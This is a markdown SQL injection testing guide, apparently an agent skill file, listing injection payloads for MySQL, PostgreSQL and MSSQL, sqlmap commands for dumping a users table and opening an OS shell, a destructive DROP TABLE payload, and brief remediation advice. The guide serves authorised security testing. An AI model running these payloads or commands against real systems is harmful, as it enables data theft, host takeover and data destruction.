# SQL Injection Testing Skill

## Overview
SQL injection vulnerabilities occur when user input is incorrectly filtered or not strongly typed.

## Testing Methodology

### 1. Detection
```
# Boolean-based blind
' OR 1=1 --
' AND 1=2 --

# Time-based blind  
' AND SLEEP(5) --
' OR SLEEP(5) --

# Union-based
' UNION SELECT NULL --
' UNION SELECT 1,2,3 --

# Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --
```

### 2. Tools
- **sqlmap**: Automatic SQL injection detection and exploitation
- **ffuf**: Quick parameter fuzzing
- ** nuclei**: Template-based detection

### 3. Payloads by Type

#### MySQL
```sql
' OR '1'='1
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT SLEEP(5))a)--
```

#### PostgreSQL
```sql
' OR '1'='1
' UNION SELECT NULL--
'; DROP TABLE users--
' AND 1=CAST(@@version AS int)--
```

#### MSSQL
```sql
' OR 1=1--
'; SELECT * FROM users--
'; WAITFOR DELAY '00:00:05'--
```

### 4. Exploitation Commands

```bash
# Basic scan with sqlmap
sqlmap -r request.txt --batch --level=5

# Specific parameter
sqlmap -r request.txt -p id --batch

# Database enumeration
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D database_name --tables
sqlmap -r request.txt -D database_name -T users --dump

# Shell access
sqlmap -r request.txt --os-shell
```

### 5. Remediation
- Use parameterized queries (Prepared Statements)
- Input validation and whitelisting
- Least privilege principle for database accounts
- Regular security scanning

## Testing Checklist
- [ ] Identify all user-input fields
- [ ] Test with boolean-based payloads
- [ ] Test with time-based payloads
- [ ] Test union-based payloads
- [ ] Enumerate database version and structure
- [ ] Attempt data extraction
- [ ] Document findings with evidence
